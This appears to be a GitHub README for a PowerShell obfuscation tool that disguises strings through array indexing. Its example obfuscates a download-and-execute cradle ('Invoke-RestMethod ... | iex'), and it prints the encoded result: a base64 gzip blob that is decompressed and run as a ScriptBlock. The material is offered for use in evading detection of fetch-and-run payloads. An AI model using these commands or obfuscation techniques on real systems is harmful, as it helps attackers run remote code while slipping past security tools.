# Obfuscation_tools
The script String_obfuscation.py abuses PowerShell's ability to index an array to replace characters in a string.

Examples of this technique:

_##Invoke-RestMethod -uri 127.0.0.1/test.ps1 | iex##_

&([ScriptBlock]::Create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAKmjd2YC/81SS4+iQBD+K3ua0TAjqKg4yR4QUAEBweYhkz3waBAVGpsWgV8/bHYOG8972Eoq9fi+1Cv1MngZfB4inJVkdUXR5dfHh4BhQOBgoMPHuxGeYUR+yMboQPp0bsEghvgJElBeYlhVGSpGmy4r/1CfC2gwR7j9xt4+BVTUEJO+3xqjfBVUcM72YFakg9ctW8m8mp/jyVGgx4aibvdqpM2N3u6qwjM1UW7HZ4nRdLkhIrCI7pu4C24YBFWvyIkTGxyJ0V3SKiOOabqZrKOzAwIs7zqZIUvRfhwUIijSRKv4W/AAIFRThd9dEyUT1nwvr8Ph8O3zabu/fA3FsB9ehNF3ruePfp8HIKmIB300fL/j7L8/79Q1TZuImtlta65JF4y0AbFB6ShL19Ot50WRYY/5fXrmrau+qxcnyq0uFdRFoGNmGk4nIR3RJw4WNJXU7SKZnVr5Mnf0lbxVSl+zfR5H6UKyjnznH9z7ytog6cIi7iSUZX29T3Bou1Sra8lGEHaMA+Qdz2v5UgWynTqbu6sKmyRqlgZFw/ONS2YcKSekgXHaFtOorscTz8qtTnW4chx5EtNp2/URZ6wuTyETeX61R7U7Z9nTHWRHQrdB6MFHNnPnzdgrZdCEFrcPHGW5v7UKpbeMH3OzfAG5vvTDuUI2O9ypGPjNAcZ01Yk9wgv9d/z8B+/xBfI1mYB7AwAA'))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))

![image](https://github.com/0xB4DC0DE/Obfuscation_tools/assets/26174989/7f622713-f02d-410f-894c-f367599ff0f0)
